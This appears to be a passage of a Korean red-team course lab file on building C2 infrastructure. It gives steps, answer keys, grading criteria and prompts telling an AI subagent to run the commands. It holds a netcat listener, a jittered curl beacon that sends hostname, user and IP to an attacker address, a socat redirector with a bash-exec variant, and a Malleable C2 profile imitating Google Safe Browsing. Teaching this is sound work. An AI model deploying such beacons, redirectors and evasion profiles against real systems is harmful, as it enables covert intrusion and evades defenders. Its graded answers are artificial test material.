lab_id: attack-adv-ai-week07
title: C2 인프라 구축과 운영 (AI 지원)
version: ai
course: attack-adv-ai
week: 7
description: Command and Control(C2) 인프라의 설계, 구축, 운영을 실습한다. 다중 리다이렉터, 도메인 프론팅, 암호화
  통신 등 탐지 회피를 위한 C2 인프라 기법을 다룬다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 120
objectives:
- C2 인프라의 아키텍처와 구성 요소를 이해한다
- 리다이렉터, 도메인 프론팅 등 은닉 기법을 적용한다
- Malleable C2 프로파일의 원리를 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 기본 C2 리스너를 구성하라. netcat을 사용하여 {{ATTACKER_IP}}의 포트 443에서 HTTPS 포트를 흉내내는
    리스너를 설정하라(백그라운드).
  hint: nc -lvnp 443으로 리스닝하고 &로 백그라운드 실행한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 기본 C2 리스너를 구성하라. netcat을 사용하여 10.20.30.201의 포트 443에서 HTTPS 포트를
    흉내내는 리스너를 설정하라(백그라운드)해줘

    📎 참고 (CLI): nc -lvnp 4443 &>/tmp/c2_listener.log & echo "C2 Listener PID: $!"
    && sleep 1 && ss -tlnp | grep 4443'
  answer_detail: C2 리스너는 감염된 호스트(비콘)로부터의 콜백을 수신한다. 실전에서는 443(HTTPS)이나 80(HTTP) 포트를
    사용하여 정상 트래픽으로 위장한다. Cobalt Strike, Sliver, Havoc 등의 C2 프레임워크는 GUI 기반으로 다중 리스너,
    세션 관리, 포스트 익스플로잇을 지원한다.
  verify:
    type: output_contains
    expect: C2 Listener
    field: stdout
    semantic:
      intent: 기본 C2 리스너 구성 — netcat 으로 HTTPS(443/4443) 포트에서 비콘 콜백을 수신하는 리스너 백그라운드
        실행
      success_criteria:
      - nc -lvnp <port> 형태의 리스너 명령 제시
      - 백그라운드(&) 실행 및 PID 출력
      - ss/netstat 로 리스너 활성화 확인
      acceptable_methods:
      - nc -lvnp <port> & + ss -tlnp | grep <port>
      - socat TCP-LISTEN:<port>,fork EXEC:bash
      - python3 -m http.server 를 placeholder 로 사용
      - ncat --ssl 로 HTTPS 흉내
      negative_signs:
      - 리스너 실행 없이 개념만 설명
      - 포트 확인 없이 바로 종료
      - SSL 없이 HTTP 만 리스닝 (HTTPS 흉내 요구 미달)
  target_vm: attacker
  script: 'nc -lvnp 4443 &>/tmp/c2_listener.log & echo "C2 Listener PID: $!" && sleep
    1 && ss -tlnp | grep 4443'
  risk_level: medium
  bastion_prompt: '기본 C2 리스너를 구성하라. netcat을 사용하여 10.20.30.201의 포트 443에서 HTTPS 포트를
    흉내내는 리스너를 설정하라(백그라운드)해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: C2 비콘을 시뮬레이션하라. curl을 사용하여 5초 간격으로 C2 서버에 체크인하는 비콘 스크립트를 /tmp/beacon.sh에
    작성하라.
  hint: while 루프와 sleep으로 주기적 HTTP 요청을 보내는 스크립트를 작성한다
  category: exploit
  points: 10
  answer: "\U0001F916 프롬프트: C2 비콘을 시뮬레이션하라 구현 방법과 예시를 설명해줘\n\U0001F4CE 참고 (CLI): cat\
    \ > /tmp/beacon.sh << 'SHEOF'\n#!/bin/bash\n# C2 Beacon Simulator - Educational\
    \ Purpose Only\nC2_SERVER=\"http://10.20.30.201:4443\"\nSLEEP_TIME=5\nJITTER=2\n\
    \nwhile true; do\n    HOSTNAME=$(hostname)\n    USER=$(whoami)\n    IP=$(hostname\
    \ -I | awk '{print $1}')\n    CHECKIN=\"beacon=$HOSTNAME&user=$USER&ip=$IP&time=$(date\
    \ +%s)\"\n    curl -s -o /dev/null \"$C2_SERVER/api/checkin?$CHECKIN\" 2>/dev/null\n\
    \    ACTUAL_SLEEP=$((SLEEP_TIME + RANDOM % JITTER))\n    sleep $ACTUAL_SLEEP\n\
    done\nSHEOF\nchmod +x /tmp/beacon.sh && cat /tmp/beacon.sh && echo '' && echo\
    \ 'Beacon script created (not executed)'"
  answer_detail: C2 비콘은 주기적으로 C2 서버에 체크인하여 명령을 받아 실행한다. 지터(Jitter)는 체크인 간격에 무작위성을
    추가하여 일정 패턴 기반 탐지를 회피한다. 실제 비콘은 프로세스 인젝션, 메모리 전용 실행, 암호화 통신 등으로 탐지를 어렵게 만든다.
  verify:
    type: output_contains
    expect: Beacon script
    field: stdout
    semantic:
      intent: C2 비콘 시뮬레이션 스크립트 /tmp/beacon.sh 작성 — 주기적 curl 요청과 jitter 로 C2 서버 체크인
      success_criteria:
      - while true + sleep + jitter(RANDOM) 구조의 반복 체크인
      - hostname/whoami/IP 를 GET 파라미터 또는 POST body 로 전송
      - 파일 작성 후 chmod +x 및 cat 검증, 실행은 선택
      acceptable_methods:
      - heredoc 으로 .sh 파일 작성
      - python 으로 동등 비콘 스크립트
      - PowerShell/Windows batch 로 동등 작성
      - curl 대신 wget/python requests 대체
      negative_signs:
      - 단일 HTTP 요청만 (반복 없음)
      - jitter 또는 sleep 없음 (패턴 탐지 쉬움)
      - 스크립트 저장 없이 설명만
  target_vm: attacker
  script: "cat > /tmp/beacon.sh << 'SHEOF'\n#!/bin/bash\n# C2 Beacon Simulator - Educational\
    \ Purpose Only\nC2_SERVER=\"http://10.20.30.201:4443\"\nSLEEP_TIME=5\nJITTER=2\n\
    \nwhile true; do\n    HOSTNAME=$(hostname)\n    USER=$(whoami)\n    IP=$(hostname\
    \ -I | awk '{print $1}')\n    CHECKIN=\"beacon=$HOSTNAME&user=$USER&ip=$IP&time=$(date\
    \ +%s)\"\n    curl -s -o /dev/null \"$C2_SERVER/api/checkin?$CHECKIN\" 2>/dev/null\n\
    \    ACTUAL_SLEEP=$((SLEEP_TIME + RANDOM % JITTER))\n    sleep $ACTUAL_SLEEP\n\
    done\nSHEOF\nchmod +x /tmp/beacon.sh && cat /tmp/beacon.sh && echo '' && echo\
    \ 'Beacon script created (not executed)'"
  risk_level: medium
  bastion_prompt: 'C2 비콘을 시뮬레이션하라. curl을 사용하여 5초 간격으로 C2 서버에 체크인하는 비콘 스크립트를 /tmp/beacon.sh에
    작성하라.


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: 리다이렉터를 시뮬레이션하라. socat을 사용하여 로컬 포트 8443의 트래픽을 C2 서버({{ATTACKER_IP}}:4443)로
    포워딩하는 명령을 작성하라.
  hint: socat TCP-LISTEN:포트,fork TCP:대상:포트 형태로 포워딩한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 리다이렉터를 시뮬레이션하라 구현 방법과 예시를 설명해줘

    📎 참고 (CLI): echo ''socat TCP-LISTEN:8443,reuseaddr,fork TCP:10.20.30.201:4443
    &'' && echo '''' && echo ''=== C2 Redirector Architecture ==='' && echo ''Victim
    -> Redirector (8443) -> C2 Server (4443)'' && echo '''' && echo ''Benefits:''
    && echo ''1. C2 server IP not exposed to victims'' && echo ''2. Multiple redirectors
    for redundancy'' && echo ''3. Quick burn and replace if detected'' && echo ''4.
    Geographic distribution for evasion'''
  answer_detail: 리다이렉터는 비콘 트래픽을 실제 C2 서버로 중계하여 C2 서버의 IP를 숨긴다. 리다이렉터가 탐지되어 차단되면 새
    리다이렉터로 교체하고 C2 서버는 유지한다. Apache mod_rewrite를 사용한 조건부 리다이렉션은 보안 연구원의 직접 접근을 차단하면서
    비콘만 통과시킨다.
  verify:
    type: output_contains
    expect: C2 Redirector
    field: stdout
    semantic:
      intent: C2 리다이렉터 — socat 으로 로컬 포트 트래픽을 실제 C2 서버로 포워딩해 C2 IP 은폐
      success_criteria:
      - socat TCP-LISTEN:<front>,reuseaddr,fork TCP:<c2_ip>:<c2_port> 형태 명령
      - 리다이렉터 아키텍처(Victim → Redirector → C2) 서술
      - C2 IP 은폐·redundancy·burn & replace 등 운영 이점 언급
      acceptable_methods:
      - socat 직접 실행
      - nginx/apache mod_rewrite 조건부 리다이렉트
      - iptables DNAT 로 포트 포워딩
      - cloudflare/cloudfront workers 를 HTTPS 리다이렉터로 사용
      negative_signs:
      - 단순 포트 포워딩만 설명 (리다이렉터 개념 누락)
      - C2 운영 이점 언급 없음
      - 명령만 나열하고 의미 해석 없음
  target_vm: attacker
  script: echo 'socat TCP-LISTEN:8443,reuseaddr,fork TCP:10.20.30.201:4443 &' && echo
    '' && echo '=== C2 Redirector Architecture ===' && echo 'Victim -> Redirector
    (8443) -> C2 Server (4443)' && echo '' && echo 'Benefits:' && echo '1. C2 server
    IP not exposed to victims' && echo '2. Multiple redirectors for redundancy' &&
    echo '3. Quick burn and replace if detected' && echo '4. Geographic distribution
    for evasion'
  risk_level: medium
  bastion_prompt: '리다이렉터를 시뮬레이션하라. socat을 사용하여 로컬 포트 8443의 트래픽을 C2 서버({{ATTACKER_IP}}:4443)로
    포워딩하는 명령을 작성하라.


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: 도메인 프론팅(Domain Fronting) 기법의 원리를 분석하고 문서화하라. CDN을 통한 트래픽 은닉 과정을 설명하라.
  hint: SNI와 Host 헤더의 불일치를 활용하는 원리를 설명한다
  category: analysis
  points: 10
  answer: '🤖 프롬프트: 도메인 프론팅(Domain Fronting) 기법의 원리를 분석하고 문서화하라. CDN을 통한 트래픽 은닉 과정을
    설명해줘

    📎 참고 (CLI): echo -e ''=== Domain Fronting ===\n\n[Principle]\nTLS SNI: legitimate-cdn.com
    (seen by network monitor)\nHTTP Host: c2.attacker.com (processed by CDN backend)\n\n[Flow]\n1.
    Beacon connects to CDN IP (e.g., CloudFront)\n2. TLS handshake shows SNI = trusted-domain.com\n3.
    HTTP Host header = attacker-backend.com\n4. CDN routes to attacker backend\n5.
    Network monitor sees only CDN traffic\n\n[Detection]\n- Compare SNI vs Host header
    (requires TLS inspection)\n- Monitor for unusual CDN usage patterns\n- DNS analytics
    for CDN CNAME chains\n\n[Status]\n- Major CDNs (AWS, Azure, GCP) now block domain
    fronting\n- Alternative: Domain borrowing, CDN tunneling still possible'''
  answer_detail: 도메인 프론팅은 CDN의 라우팅 로직을 악용하여 트래픽의 실제 목적지를 숨긴다. TLS SNI에는 합법적 도메인을,
    HTTP Host 헤더에는 C2 도메인을 설정하면 네트워크 모니터에는 CDN 트래픽으로만 보인다. 주요 클라우드 제공업체가 이를 차단하였으나,
    유사 변형 기법은 지속적으로 발전하고 있다.
  verify:
    type: output_contains
    expect: Domain Fronting
    field: stdout
    semantic:
      intent: 도메인 프론팅 기법 원리 분석 — TLS SNI 와 HTTP Host 헤더 불일치로 네트워크 모니터에서 합법 CDN 트래픽으로
        위장
      success_criteria:
      - SNI != Host 의 불일치가 프론팅의 핵심이라고 서술
      - CDN(CloudFront, Fastly 등) 경유 라우팅 플로우 5단계 이상 설명
      - 주요 CDN 제공자(AWS/Azure/GCP)의 프론팅 차단 현황과 Domain Borrowing 등 대체 기법 언급
      acceptable_methods:
      - echo -e 또는 heredoc 으로 원리 문서 출력
      - markdown/ASCII 다이어그램
      - 실제 curl --resolve 로 SNI vs Host 조작 예
      - 탐지(TLS inspection) 관점 언급
      negative_signs:
      - SNI 나 Host 한 쪽만 언급
      - CDN 역할 설명 없음
      - 차단 현황/대체기법 누락
  target_vm: attacker
  script: 'echo -e ''=== Domain Fronting ===\n\n[Principle]\nTLS SNI: legitimate-cdn.com
    (seen by network monitor)\nHTTP Host: c2.attacker.com (processed by CDN backend)\n\n[Flow]\n1.
    Beacon connects to CDN IP (e.g., CloudFront)\n2. TLS handshake shows SNI = trusted-domain.com\n3.
    HTTP Host header = attacker-backend.com\n4. CDN routes to attacker backend\n5.
    Network monitor sees only CDN traffic\n\n[Detection]\n- Compare SNI vs Host header
    (requires TLS inspection)\n- Monitor for unusual CDN usage patterns\n- DNS analytics
    for CDN CNAME chains\n\n[Status]\n- Major CDNs (AWS, Azure, GCP) now block domain
    fronting\n- Alternative: Domain borrowing, CDN tunneling still possible'''
  risk_level: low
  bastion_prompt: 도메인 프론팅(Domain Fronting) 기법의 원리를 분석하고 문서화하라. CDN을 통한 트래픽 은닉 과정을
    설명해줘
- order: 5
  instruction: Malleable C2 프로파일의 개념을 이해하라. HTTP 요청/응답을 정상 웹 트래픽으로 위장하는 프로파일 예제를 /tmp/c2_profile.txt에
    작성하라.
  hint: Cobalt Strike의 Malleable C2 프로파일 형식을 참고하여 HTTP 변환 규칙을 작성한다
  category: exploit
  points: 10
  answer: "\U0001F916 프롬프트: Malleable C2 프로파일의 개념을 이해하라 구현 방법과 예시를 설명해줘\n\U0001F4CE\
    \ 참고 (CLI): cat > /tmp/c2_profile.txt << 'EOF'\n=== Malleable C2 Profile (Google\
    \ Safe Browsing Mimicry) ===\n\nhttp-get {\n    set uri \"/safebrowsing/rd/CltOb12nLW1IbHehYhg\"\
    ;\n    client {\n        header \"Accept\" \"text/html,*/*\";\n        header\
    \ \"Accept-Language\" \"en-US\";\n        header \"Connection\" \"close\";\n \
    \       metadata {\n            base64url;\n            append \".class\";\n \
    \           parameter \"ct\";\n        }\n    }\n    server {\n        header\
    \ \"Content-Type\" \"application/octet-stream\";\n        header \"Cache-Control\"\
    \ \"public,max-age=172800\";\n        output {\n            prepend \"GIF89a\"\
    ;\n            base64;\n            print;\n        }\n    }\n}\n\nhttp-post {\n\
    \    set uri \"/safebrowsing/report\";\n    client {\n        header \"Content-Type\"\
    \ \"application/x-www-form-urlencoded\";\n        output {\n            base64;\n\
    \            parameter \"data\";\n        }\n    }\n}\n\n# Traffic appears as\
    \ Google Safe Browsing API calls\n# Data hidden in parameters and GIF file responses\n\
    EOF\ncat /tmp/c2_profile.txt"
  answer_detail: Malleable C2 프로파일은 C2 트래픽의 네트워크 시그니처를 커스터마이즈한다. HTTP 헤더, URI 패턴,
    데이터 인코딩을 정상 서비스(Google API, Microsoft Update 등)와 동일하게 설정하면 네트워크 IDS/IPS의 시그니처
    탐지를 회피할 수 있다. JA3/JA3S 핑거프린트도 고려해야 한다.
  verify:
    type: output_contains
    expect: Malleable C2 Profile
    field: stdout
    semantic:
      intent: Malleable C2 프로파일 — HTTP 요청·응답 패턴을 정상 서비스로 위장하는 프로파일을 /tmp/c2_profile.txt
        에 작성
      success_criteria:
      - http-get 블록(URI/헤더/base64url 메타데이터) 포함
      - http-post 블록(URI/Content-Type/base64 데이터) 포함
      - Google Safe Browsing 등 특정 서비스 흉내 언급 및 JA3/JA3S 핑거프린트 맥락
      acceptable_methods:
      - Cobalt Strike Malleable 프로파일 형식으로 작성
      - Sliver/Havoc 프로파일 형식
      - YAML/JSON 으로 동등 구조 표현
      - 예시 프로파일을 그대로 cat 출력
      negative_signs:
      - http-get 또는 http-post 한쪽만
      - 헤더/URI 패턴 없이 문장 설명만
      - 프로파일 파일 생성 누락
  target_vm: attacker
  script: "cat > /tmp/c2_profile.txt << 'EOF'\n=== Malleable C2 Profile (Google Safe\
    \ Browsing Mimicry) ===\n\nhttp-get {\n    set uri \"/safebrowsing/rd/CltOb12nLW1IbHehYhg\"\
    ;\n    client {\n        header \"Accept\" \"text/html,*/*\";\n        header\
